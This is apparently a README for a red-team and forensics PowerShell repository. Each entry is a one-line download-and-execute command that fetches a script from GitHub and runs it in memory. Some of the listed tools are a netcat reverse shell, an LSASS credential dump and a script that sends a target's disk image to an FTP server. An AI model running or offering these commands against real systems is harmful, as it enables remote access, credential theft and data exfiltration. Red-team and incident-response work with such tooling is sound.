# Eren Red Team
This repository contains the scripts that is created by Eren Red Team.

## PowerCyberPipe.ps1
Downloads necessary installation packages for CyberPipe and runs it, creates .vhdx file of the target.
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerCyberPipe.ps1')
```

## TraVHDX.ps1
Automatically finds .vhdx file in the determined destination path and sends it to FTP server.
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/TraVHDX.ps1')
```

## TriageStorage.ps1
Triage tools with little automation
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/TriageStorage.ps1') 
```

## PowerPDFiD.ps1
String search tool inspired by Didier Stevens's PDFiD
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerPDFiD.ps1') 
```

## PowerPython.ps1
Python and PIP Installation using Chocolatey
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerPython.ps1') 
```

## PowerOLE.ps1
Glue to use ole-tools
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerOLE.ps1') 
```

## PowerNetCat.ps1
Simple reverse shell with netcat without no obfuscation
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerNetCat.ps1') 
```

## PowerLSASS.ps1
Loudest LSASS dump ever
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerLSASS.ps1') 
```

## PowerEventLogger.ps1
Enables advanced audit policies and PowerShell logging for detailed process, authentication, and privilege monitoring
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerEventLogger.ps1') 
```

## PowerTaskScan.ps1
Performs a scan of all running processes and scheduled tasks 
``` powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/PowerTaskScan.ps1') 
```